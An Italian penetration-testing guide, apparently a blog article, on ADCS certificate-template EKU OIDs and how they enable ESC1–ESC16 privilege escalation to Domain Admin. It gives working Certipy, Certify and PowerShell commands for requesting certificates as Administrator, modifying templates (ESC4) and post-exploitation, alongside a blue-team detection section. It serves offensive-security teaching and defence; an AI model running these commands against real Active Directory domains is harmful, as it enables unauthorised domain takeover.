---
title: 'EKU OID in ADCS: Guida Completa per il Penetration Testing su Active Directory'
slug: adcs-eku-oid-offensive
description: >-
  Tutti gli EKU OID dei certificati Active Directory spiegati in ottica
  offensiva: quali sfruttare in ESC1–ESC16, attack flow PKINIT, detection Event
  ID, FAQ e tabella completa con rilevanza offensiva.
image: /adcs-eku-oid-certificate-template-pentest.webp
draft: false
date: 2026-07-02T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - adcs
  - active-directory
---

# EKU OID ADCS: Identificazione e Abuso nei Certificate Template

Se hai mai letto l'output di `certify.exe find` o `certipy find`, avrai visto numeri come `1.3.6.1.5.5.7.3.2` accanto a voci come "Client Authentication". Quei numeri si chiamano **OID** (Object Identifier) e definiscono a cosa serve un certificato X.509. In fase offensiva su Active Directory, capire quali OID rendono un certificate template sfruttabile è la differenza tra trovare un vettore di privilege escalation e passarci davanti senza vederlo.

Questa guida copre tutti gli EKU OID rilevanti nei penetration test ADCS — con attack flow reale, tabella di riferimento, esempi pratici con Certipy e Certify, sezione detection per capire cosa vede il blue team e FAQ operative.

***

## TL;DR — EKU OID offensivi: quick reference

Se sei già nel mezzo di un engagement, questa è la lista che ti serve:

| OID                       | Nome                         | Quando è pericoloso                            |
| ------------------------- | ---------------------------- | ---------------------------------------------- |
| `1.3.6.1.5.5.7.3.2`       | Client Authentication        | + ENROLLEE\_SUPPLIES\_SUBJECT → ESC1/ESC4      |
| `1.3.6.1.4.1.311.20.2.2`  | Smart Card Logon             | richiesto per PKINIT su molti DC               |
| `1.3.6.1.5.2.3.4`         | PKINIT Client Authentication | equivalente a Client Auth per PKINIT           |
| `1.3.6.1.4.1.311.20.2.1`  | Certificate Request Agent    | enrollment on-behalf-of → ESC3                 |
| `2.5.29.37.0`             | Any Purpose                  | qualsiasi uso, incluso enrollment agent → ESC2 |
| `1.3.6.1.4.1.311.10.12.1` | Any Application Policy       | equivalente ad Any Purpose                     |
| nessun EKU                | SubCA implicita              | firma cert arbitrari → ESC2                    |
| `1.3.6.1.5.5.7.3.1`       | Server Authentication        | solo su template V1 → ESC15                    |

Gli altri OID (EFS, IPSec, S/MIME, Time Stamping, ecc.) non sono rilevanti per privilege escalation AD e vengono ignorati in questa guida.

***

## Cos'è un EKU OID

**EKU** sta per Extended Key Usage (in Microsoft anche Enhanced Key Usage — stessa cosa, stessa abbreviazione). È un'estensione del certificato X.509 che specifica per quali scopi il certificato può essere usato. Ogni scopo è identificato da un **OID** — una stringa numerica gerarchica standardizzata a livello internazionale.

In Active Directory Certificate Services (ADCS), ogni certificate template ha una lista di EKU configurati tramite due attributi AD distinti:

`pKIExtendedKeyUsage` — gli EKU standard del template

`msPKI-Certificate-Application-Policy` — la Application Policy proprietaria Microsoft, che se presente nel certificato emesso **sovrascrive** gli EKU standard. Questo è il meccanismo alla base di ESC15.

Per capire come questi template vengono sfruttati nel contesto completo degli attacchi ESC1–ESC16, leggi la [guida completa agli attacchi ADCS su hackita.it](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Attack flow reale: da utente normale a Domain Admin via certificati

Questo è il percorso tipico in un ADCS exploitation durante un pentest AD. Ogni step dipende dagli OID presenti nel template e dalle sue ACL.

**Fase 1 — Enumeration**
Si identificano i certificate template accessibili e i loro EKU. Tool: `certipy find`, `certify.exe find`, `certutil -catemplates`.

**Fase 2 — Identificazione vettore**
Se il template ha Client Authentication + ENROLLEE\_SUPPLIES\_SUBJECT + enrollment aperto → ESC1 diretto.
Se hai GenericAll sul template ma mancano gli EKU offensivi → ESC4: modifichi tu il template.
Se il template ha Any Purpose → ESC2, catena verso ESC3.

**Fase 3 — Cert request**
Si richiede un certificato specificando come soggetto `administrator@dominio.local`. Il campo SAN viene popolato con l'UPN dell'account target.

**Fase 4 — PKINIT / autenticazione**
Il PFX (cert + chiave privata) viene usato per autenticarsi al DC via Kerberos PKINIT. Il DC valida il cert, verifica gli EKU (Client Authentication o Smart Card Logon), mappa il SAN all'account AD e rilascia un TGT.

**Fase 5 — Post-exploitation**
Con il TGT si può fare Pass-the-Ticket, DCSync, o accedere direttamente via evil-winrm. Certipy restituisce anche l'NT hash dell'account tramite UnPAC-the-hash, senza toccare LSASS.

```
low-priv user
    │
    ├─► certipy find / certify find
    │       └─► template con Client Auth + ENROLLEE_SUPPLIES_SUBJECT
    │
    ├─► certipy req -upn administrator@domain.local
    │       └─► CA emette cert per Administrator
    │
    ├─► certipy auth -pfx administrator.pfx
    │       └─► PKINIT → TGT + NT hash
    │
    └─► evil-winrm / psexec / DCSync
            └─► Domain Admin
```

Se PKINIT fallisce, il fallback è Schannel su LDAPS: `certipy auth -pfx administrator.pfx -ldap-shell`.

***

## Tabella completa EKU OID — offensivo vs non rilevante

> Nota: il mapping ESC dipende sempre dalla combinazione EKU + flags del template (ENROLLEE\_SUPPLIES\_SUBJECT, CT\_FLAG\_NO\_SECURITY\_EXTENSION, ecc.) + ACL. Gli OID da soli non determinano la vulnerabilità — è sempre la configurazione complessiva del template che conta.

| OID                        | Nome                           | Rilevanza Offensiva | ESC correlato      |
| -------------------------- | ------------------------------ | ------------------- | ------------------ |
| `1.3.6.1.5.5.7.3.1`        | Server Authentication          | ⬜ Non diretto       | ESC15 (solo V1)    |
| `1.3.6.1.5.5.7.3.2`        | Client Authentication          | 🔴 Critico          | ESC1, ESC4         |
| `1.3.6.1.5.5.7.3.3`        | Code Signing                   | 🟡 Contestuale      | firma binari       |
| `1.3.6.1.5.5.7.3.4`        | Secure Email (S/MIME)          | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.5.7.3.5`        | IPSec End System               | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.5.7.3.6`        | IPSec Tunnel                   | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.5.7.3.7`        | IPSec User                     | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.5.7.3.8`        | Time Stamping                  | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.5.7.3.9`        | OCSP Signing                   | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.2.3.4`          | PKINIT Client Authentication   | 🔴 Critico          | ESC1 alternativo   |
| `1.3.6.1.4.1.311.20.2.2`   | Smart Card Logon               | 🔴 Critico          | ESC1, ESC4, PKINIT |
| `1.3.6.1.4.1.311.20.2.1`   | Certificate Request Agent      | 🔴 Critico          | ESC3               |
| `1.3.6.1.4.1.311.10.3.1`   | CTL Signing                    | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.3.4`   | EFS                            | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.3.4.1` | EFS Recovery                   | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.3.8`   | Embedded NT Crypto             | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.3.11`  | Key Recovery                   | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.3.12`  | Document Signing               | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.5.1`   | DRM                            | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.10.12.1`  | Any Application Policy         | 🔴 Critico          | ESC2               |
| `1.3.6.1.4.1.311.21.5`     | CA Key Archival                | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.21.19`    | DS Email Replication           | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.20.1`     | Auto Enroll CTL                | ⬜ Non rilevante     | —                  |
| `1.3.6.1.5.5.8.2.2`        | IKE Intermediate               | ⬜ Non rilevante     | —                  |
| `1.3.6.1.4.1.311.25.2`     | szOID\_NTDS\_CA\_SECURITY\_EXT | 🟡 Difensivo        | ESC9, ESC16        |
| `2.5.29.37.0`              | Any Purpose                    | 🔴 Critico          | ESC2               |
| nessun EKU                 | SubCA implicita                | 🔴 Critico          | ESC2               |

***

## Attack Matrix — EKU + condizione → ESC

| EKU presente               | Condizione aggiuntiva                                        | ESC sfruttabile |
| -------------------------- | ------------------------------------------------------------ | --------------- |
| Client Authentication      | + ENROLLEE\_SUPPLIES\_SUBJECT + enrollment aperto            | ESC1            |
| Client Authentication      | + GenericAll sul template (da aggiungere)                    | ESC4            |
| Any Purpose / No EKU       | enrollment aperto                                            | ESC2            |
| Certificate Request Agent  | + template target per enroll-on-behalf                       | ESC3            |
| Server Authentication (V1) | + ENROLLEE\_SUPPLIES\_SUBJECT + Application Policy injection | ESC15           |
| qualsiasi Auth EKU         | + CT\_FLAG\_NO\_SECURITY\_EXTENSION                          | ESC9            |

***

## OID offensivamente critici — spiegazione dettagliata

### `1.3.6.1.5.5.7.3.2` — Client Authentication

Quando il Domain Controller riceve un certificato con questo OID via Kerberos PKINIT, lo usa per mappare l'identità nel SAN a un account AD e rilasciare un TGT. È l'OID che rende possibile l'autenticazione senza password.

Combinato con `ENROLLEE_SUPPLIES_SUBJECT` su un template accessibile a utenti normali, permette di richiedere un cert come `administrator@dominio.htb` — **ESC1 diretto**. Se invece hai GenericAll su un template che non ha questo OID, puoi aggiungerlo trasformando la situazione in **ESC4**:

```powershell
$EKUs = @("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
Set-ADObject "CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=htb" `
  -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
```

Fonte originale della ricerca ADCS exploitation: [SpecterOps Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).

***

### `1.3.6.1.4.1.311.20.2.2` — Smart Card Logon

OID Microsoft per l'autenticazione via smart card. Il KDC lo richiede in molte configurazioni per supportare PKINIT. Si aggiunge sempre in coppia con Client Authentication — alcuni DC verificano entrambi, altri accettano solo uno dei due. In ambienti reali averli entrambi garantisce compatibilità massima.

```bash
certipy auth -pfx administrator.pfx -dc-ip <IP_DC>
# Se PKINIT fallisce:
certipy auth -pfx administrator.pfx -dc-ip <IP_DC> -ldap-shell
```

***

### `1.3.6.1.5.2.3.4` — PKINIT Client Authentication

Riservato specificamente al protocollo PKINIT. Funzionalmente equivalente a Client Authentication per gli scopi offensivi. Compare in configurazioni personalizzate e ambienti cross-domain o cross-forest.

***

### `1.3.6.1.4.1.311.20.2.1` — Certificate Request Agent (Enrollment Agent)

Chi possiede un cert con questo OID può richiedere certificati per conto di altri utenti. È la base di **ESC3**, un attacco in due fasi che non richiede direttamente ENROLLEE\_SUPPLIES\_SUBJECT:

```bash
# Fase 1: ottieni il cert da Enrollment Agent
certipy req -u user@corp.local -p Password -ca CORP-CA -template ESC3_Template

# Fase 2: richiedi un cert per Administrator usando l'enrollment agent cert
certipy req -u user@corp.local -p Password -ca CORP-CA -template User \
  -on-behalf-of corp\\administrator -pfx enrollment_agent.pfx
```

***

### `2.5.29.37.0` / `1.3.6.1.4.1.311.10.12.1` — Any Purpose / Any Application Policy

Il più permissivo. Un cert con questi OID può essere usato per qualsiasi scopo — autenticazione client, enrollment agent, firma. È **ESC2**. Da solo non impersona altri utenti come ESC1, ma apre la catena verso ESC3:

```bash
certipy find -u user@corp.local -p Password -dc-ip 10.10.10.10 -vulnerable
# cerca: Any Purpose: True
```

***

### `1.3.6.1.5.5.7.3.1` — Server Authentication e ESC15

Da solo non permette impersonation di utenti AD. Ma su **template V1** (schema version 1, come `WebServer` che è presente di default in ogni installazione ADCS), un attaccante può iniettare Application Policy arbitrarie nella cert request aggiungendo Client Authentication — **ESC15**. Patchato da Microsoft nel novembre 2024:

```bash
certipy req -u user@corp.local -p Password -ca CORP-CA -template WebServer \
  -upn administrator@corp.local --application-policies 'Client Authentication'
```

La ricerca originale su ESC15 è stata pubblicata da [TrustedSec](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc).

***

### `1.3.6.1.4.1.311.25.2` — szOID\_NTDS\_CA\_SECURITY\_EXT

Non è offensivo — è difensivo. Questa extension contiene il SID dell'account nel certificato, introdotta con KB5014754 nel maggio 2022 per il "strong certificate mapping". Se un template ha il flag `CT_FLAG_NO_SECURITY_EXTENSION`, questa extension viene omessa — rendendo il cert sfruttabile in **ESC9** anche su DC patchati, perché il DC non riesce a verificare il binding forte cert-account.

***

### Nessun EKU (template SubCA)

Un template senza EKU viene trattato come una CA subordinata. Il cert emesso può firmare altri certificati — inclusi cert per autenticarsi come Domain Admin. Meno comune di ESC2 con Any Purpose, ma ugualmente pericoloso e spesso ignorato durante audit.

***

## Come enumerare gli EKU in pratica

```bash
# Da Kali — certipy (preferito, output JSON + txt)
certipy find -u user@domain.htb -p Password -dc-ip 10.10.10.10 -vulnerable -stdout

# Da Windows — certify (output leggibile, compatibile con SharpCollection)
.\Certify.exe find /vulnerable
.\Certify.exe find /template:NomeTemplate

# LOLBin nativo — zero rumore, nessun binario da caricare
certutil -catemplates
certutil -dump

# PowerShell — lettura diretta degli attributi LDAP del template
$rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
$ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = $ldap
$searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=NomeTemplate))"
$template = $searcher.FindOne().GetDirectoryEntry()
Write-Host "EKU: $($template.Properties['pKIExtendedKeyUsage'])"
Write-Host "App Policy: $($template.Properties['msPKI-Certificate-Application-Policy'])"
```

Per la correlazione degli attributi LDAP con gli oggetti AD, vedi anche la guida a [ldapsearch su hackita.it](https://hackita.it/articoli/ldapsearch/).

***

## Detection — cosa vede il blue team

**Event ID 4886** — Certificate Services received a certificate request. Si genera a ogni richiesta. Da solo non indica un attacco — è il volume anomalo e il richiedente che contano.

**Event ID 4887** — Certificate Services approved a certificate request and issued a certificate. Contiene Requester, Subject e SAN. La detection principale: il campo `SubjectAltName` (SAN) non corrisponde all'account che ha fatto la richiesta. Questo è il segnale diretto di ESC1, ESC3, ESC4.

**Event ID 4768** — Kerberos TGT requested. Se `PreAuthType = 16`, indica PKINIT (certificate-based authentication). Un account privilegiato che usa PKINIT da una workstation insolita o per la prima volta è un alert ad alta priorità.

**Event ID 5136** — A directory service object was modified. Si genera quando un attaccante modifica gli attributi di un template AD — tipico di ESC4. La query SIEM: modifica a `pKIExtendedKeyUsage` o `msPKI-Certificate-Application-Policy` da parte di un account non in un gruppo PKI amministrativo.

La detection più efficace contro ESC4 è l'Event ID 5136 correlato al 4887 successivo: modifica template → emissione cert con SAN diverso dal richiedente → alert.

***

## FAQ

**Posso leggere gli EKU di un cert già emesso senza tool aggiuntivi?**
Sì — `openssl x509 -in cert.cer -noout -text | grep -A5 "Extended Key"` oppure su Windows doppio click sul file .cer, tab Dettagli, voce "Utilizzo chiave avanzato".

**Se un template ha sia Client Auth che Server Auth, è automaticamente sfruttabile?**
No — serve anche `ENROLLEE_SUPPLIES_SUBJECT` abilitato, enrollment aperto a utenti non privilegiati, e assenza di manager approval. Gli EKU da soli non determinano la vulnerabilità.

**Qual è la differenza pratica tra EKU e Application Policy?**
Tecnicamente entrambi usano gli stessi OID, ma Application Policy è l'estensione proprietaria Microsoft. Se entrambe sono presenti nel certificato emesso, Application Policy ha la precedenza — questo è il meccanismo sfruttato da ESC15 per aggirare i template con solo Server Authentication.

**Certipy `find -vulnerable` non trova nulla ma so che c'è un vettore. Perché?**
Certipy cerca misconfigurazioni già presenti. Se hai GenericAll su un template non ancora ESC1 (ESC4), non lo troverà finché non modifichi tu il template. Dopo la modifica, `certipy find -vulnerable` lo identificherà correttamente.

**Dopo ESC4, devo ripristinare il template?**
Sì — il template modificato con Client Auth + ENROLLEE\_SUPPLIES\_SUBJECT diventa sfruttabile da qualsiasi utente autenticato nel dominio. In produzione il ripristino è obbligatorio. Il comando è lo stesso `Set-ADObject` ma con `-Remove` invece di `-Add`.

**PKINIT fallisce con `KDC_ERR_PADATA_TYPE_NOSUPP`. Cosa faccio?**
Le cause più comuni sono due: il DC non ha un certificato valido installato con Smart Card Logon EKU (tipico su DC senza Domain Controller Authentication template configurato), oppure la CA che ha emesso il tuo cert non è trusted dal DC. In entrambi i casi il fallback è Schannel via LDAPS: `certipy auth -pfx administrator.pfx -dc-ip <IP> -ldap-shell`. Da lì puoi fare DCSync rights, RBCD o reset password via PassTheCert — senza toccare PKINIT.

**`certipy auth` restituisce anche l'NT hash. Posso usarlo direttamente?**
Sì — è il risultato di UnPAC-the-hash. Funziona con Pass-the-Hash via `psexec.py`, `evil-winrm`, `crackmapexec` e qualsiasi tool Impacket che accetta `-hashes`.

***

## Risorse correlate

* [Attacchi ADCS ESC1–ESC16 con Certipy — hackita.it](https://hackita.it/articoli/adcs-esc1-esc16/)
* [HTB Anubis Walkthrough — ESC4 in un ambiente reale — hackita.it](https://hackita.it/articoli/htb-anubis-walkthrough/)
* [Ldapsearch per enumerazione Active Directory — hackita.it](https://hackita.it/articoli/ldapsearch/)
* [Certified Pre-Owned whitepaper — SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
* [EKUwu: ESC15 — TrustedSec](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
* [Certipy wiki ESC1–ESC16 — GitHub](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
